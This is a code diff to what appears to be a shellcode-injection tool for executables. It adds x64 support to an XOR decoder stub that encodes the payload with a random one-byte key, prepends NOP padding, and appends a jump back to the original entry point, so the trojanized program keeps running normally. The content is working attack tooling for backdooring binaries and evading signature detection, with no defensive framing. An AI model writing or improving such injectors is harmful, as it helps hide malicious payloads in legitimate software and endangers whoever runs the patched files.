@@ -321,7 +321,7 @@ if args.info is False:
 
         endDecodeAddress = newEntryPoint + int(hex(4 + len(shellcode)), 16)
         if x64:
-            endDecodeAddressLittle = (endDecodeAddress + 15).to_bytes(8, 'little')
+            endDecodeAddressLittle = (endDecodeAddress + 0x16).to_bytes(8, 'little')
         else:
             endDecodeAddressLittle = (endDecodeAddress + 15).to_bytes(4, 'little')
         encodingKey = os.urandom(1)  # b"\x2f"
@@ -332,18 +332,32 @@ if args.info is False:
         print("\tEnd Address:\t\t" + hex(endDecodeAddress))
 
         if x64:
-            xorDecoder = b"\xB8" + (int(hex(newEntryPoint), 16) + int(hex(0x14), 16)).to_bytes(8, 'little')
+            
+            xorDecoder = b"\x48\xb8" + (int(hex(newEntryPoint), 16) + int(hex(0x1b), 16)).to_bytes(8, 'little')
+            xorDecoder += b"\x80\x30" + encodingKey
+            xorDecoder += b"\x48\xFF\xC0"
+            xorDecoder += b"\x3D" + endDecodeAddressLittle[:4]
+            xorDecoder += b"\x7e\xf3"
+
+            shellcode = xorDecoder + (xor(shellcode, encodingKey))
+
         else:
             xorDecoder = b"\xB8" + (int(hex(newEntryPoint),16) + int(hex(0x14),16)).to_bytes(4, 'little')
-        xorDecoder += b"\x80\x30" + encodingKey
-        xorDecoder += b"\x40"
-        xorDecoder += b"\x3d" + endDecodeAddressLittle
-        xorDecoder += b"\x7e\xf5"
+            xorDecoder += b"\x80\x30" + encodingKey
+            xorDecoder += b"\x40"
+            xorDecoder += b"\x3d" + endDecodeAddressLittle
+            xorDecoder += b"\x7e\xf5"
 
-        shellcode = xorDecoder + (xor(shellcode, encodingKey))
 
-    # Add return address for original program execution
-    shellcode += (b"\xB8" + returnAddress + b"\xFF\xD0")
+            shellcode = xorDecoder + (xor(shellcode, encodingKey))
+
+    if x64:
+        # Add return address for original program execution
+        shellcode += (b"\x48\xb8" + returnAddress + b"\xFF\xD0")
+
+    else:
+        # Add return address for original program execution
+        shellcode += (b"\xB8" + returnAddress + b"\xFF\xD0")
 
     # Prepend 4 NOPS to shellcode for padding
     shellcode = b"\x90\x90\x90\x90" + shellcode
